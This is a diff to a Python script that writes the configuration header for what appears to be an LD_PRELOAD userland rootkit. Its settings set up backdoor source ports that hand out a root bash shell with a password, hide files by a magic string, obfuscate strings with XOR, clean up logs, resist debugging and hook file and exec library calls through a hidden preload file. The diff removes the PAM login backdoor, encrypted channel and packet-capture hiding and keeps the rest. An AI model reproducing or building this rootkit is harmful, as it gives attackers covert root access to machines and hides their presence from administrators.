@@ -7,23 +7,16 @@ def xor(x_str):
 #-----------------------------------------------------------------------
 LOW_PORT = "61040"                    # Lowest source port for plain text backdoor
 HIGH_PORT = "61050"                   # Highest source port for plain text backdoor
-CRYPT_LOW = "61051"                   # Lowest source port for crypthook backdoor
-CRYPT_HIGH = "61060"                  # Highest source port for crypthook backdoor
-PAM_PORT = "61061"					  # Also hide this port, but don't trigger accept backdoors
-MAGIC_STRING = "__"                   # Hide files with this string in the name
+MAGIC_STRING = "__0__"                   # Hide files with this string in the name
 
-BLIND_LOGIN = "rootme"                # Username for ssh / su PAM backdoor.
 C_ROOT = "root"                       # Give accept() users these privs
 SHELL_MSG = "Welcome!\nHere's a shell: " # Welcome msg for remote user
-SHELL_PASSWD = "changeme"             # Remote password for accept backdoors
+SHELL_PASSWD = "__0__"             # Remote password for accept backdoors
 SHELL_TYPE = "/bin/bash"              # Execute this as the shell
 
 ANTI_DEBUG_MSG = "Don't scratch the walls"
 CLEANUP_LOGS = "CLEANUP_LOGS"
 
-# Crypthook key constants
-PASSPHRASE = "Hello NSA"              # This is the crypto key. CHANGE THIS.
-KEY_SALT = "changeme"                 # Used in key derivation. CHANGE THIS.
 #-----------------------------------------------------------------------
 
 print '''
@@ -36,20 +29,14 @@ print '''
 #else
 #define DEBUG(...)
 #endif
-
+#define MAX_LEN 4125
 #define LOW_PORT	''' + LOW_PORT + '''
 #define HIGH_PORT	''' + HIGH_PORT + '''
-#define CRYPT_LOW	''' + CRYPT_LOW + '''
-#define CRYPT_HIGH	''' + CRYPT_HIGH + '''
-#define PAM_PORT ''' + PAM_PORT + '''
 #define MAGIC_STRING	"''' + MAGIC_STRING + '''"
-#define BLIND_LOGIN "''' + xor(BLIND_LOGIN) + '''"
 #define C_ROOT "''' + xor(C_ROOT) + '''"
 #define SHELL_MSG "''' + xor(SHELL_MSG) + '''"
 #define SHELL_PASSWD "''' + xor(SHELL_PASSWD) + '''"
 #define SHELL_TYPE "''' + xor(SHELL_TYPE) + '''"
-#define PASSPHRASE "''' + xor(PASSPHRASE) + '''"
-#define KEY_SALT "''' + xor(KEY_SALT) + '''"
 #define ANTI_DEBUG_MSG "''' + xor(ANTI_DEBUG_MSG) + '''"
 #define CLEANUP_LOGS "''' + xor(CLEANUP_LOGS) + '''"
 #define SYS_ACCEPT 0
@@ -69,14 +56,7 @@ print '''
 #define SYS_OPENDIR 14
 #define SYS_READDIR 15
 #define SYS_READDIR64 16
-#define SYS_PAM_AUTHENTICATE 17
-#define SYS_PAM_OPEN_SESSION 18
-#define SYS_PAM_ACCT_MGMT 19
-#define SYS_GETPWNAM 20
-#define SYS_PAM_SM_AUTHENTICATE 21
-#define SYS_GETPWNAM_R 22
-#define SYS_PCAP_LOOP 23
-#define SYSCALL_SIZE 24
+#define SYSCALL_SIZE 17
 
 #define LD_NORMAL "''' + xor("/etc/ld.so.preload") + '''"
 #define LD_HIDE "''' + xor("/etc/.ld.so.preload") + '''"
@@ -111,9 +91,7 @@ static char *syscall_table[SYSCALL_SIZE] = {'''
 
 syscalls = ["accept", "access", "execve", "link", "__lxstat", "__lxstat64", 
    "open", "rmdir", "unlink", "unlinkat", "__xstat", "__xstat64",
-   "fopen", "fopen64", "opendir", "readdir", "readdir64",
-   "pam_authenticate", "pam_open_session", "pam_acct_mgmt",
-   "getpwnam", "pam_sm_authenticate", "getpwnam_r", "pcap_loop"]
+   "fopen", "fopen64", "opendir", "readdir", "readdir64"]
 
 call_str = ''
 for call in syscalls:
